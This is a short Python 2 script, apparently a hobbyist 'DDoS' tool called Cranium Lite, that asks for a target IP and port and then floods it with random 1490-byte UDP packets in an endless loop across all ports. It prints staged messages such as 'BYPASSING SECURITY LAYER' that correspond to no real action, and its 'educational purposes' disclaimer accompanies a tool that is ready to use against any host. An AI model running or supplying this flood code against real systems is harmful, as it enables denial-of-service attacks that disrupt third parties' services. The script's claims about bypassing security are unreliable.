print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Cranium Lite")
print
print "Coded By : ImmortalPrince33"
print "Author   : Team Immortal"
print "Github   : github.com/ImmortalPrince33"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Hardwares and websites for pentesting, We aren't responsible for your damages."
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet Cranium Lite")
print("Team : Immortal")
print ("\033[92m")
print "________________TRYING TO REACH THE SERVER_____________________"
time.sleep(5)
print "_________________ESTABLISHING CONNECTION_______________________"
time.sleep(5)
print "________________ BYPASSING SECURITY LAYER _____________________"
time.sleep(5)
print "_________________CONNECTION ESTABLISHED________________________"
time.sleep(5)
print "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
